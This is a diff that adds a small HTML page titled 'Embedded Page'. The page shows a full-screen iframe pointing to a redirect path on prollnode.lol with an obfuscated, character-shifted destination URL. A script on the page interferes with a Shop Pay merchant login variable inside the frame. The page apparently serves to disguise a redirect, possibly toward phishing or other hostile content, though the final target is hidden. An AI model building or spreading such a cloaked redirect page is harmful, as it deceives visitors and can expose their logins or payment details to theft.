@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Embedded Page</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        iframe {
+            width: 80%;
+            height: 80vh;
+            border: none;
+        }
+    </style>
+    <script>
+        window.addEventListener("DOMContentLoaded", function() {
+            let iframe = document.querySelector("iframe");
+            iframe.onload = function() {
+                try {
+                    let iframeWindow = iframe.contentWindow;
+                    if (iframeWindow.SHOP_PAY_MERCHANT_URL_LOGIN_PAGE_SELECTOR_TYPE3) {
+                        console.warn("Variable conflict detected, handling potential duplicate.");
+                        delete iframeWindow.SHOP_PAY_MERCHANT_URL_LOGIN_PAGE_SELECTOR_TYPE3;
+                    }
+                } catch (error) {
+                    console.error("Error handling iframe content: ", error);
+                }
+            };
+        });
+    </script>
+</head>
+<body>
+    <iframe src="https://prollnode.lol/active/go/hvtrs8%2F-wuw%2Cx%60oz.aoo%2Fgn%2Fuq%2Frlcy" allowfullscreen></iframe>
+</body>
+</html>
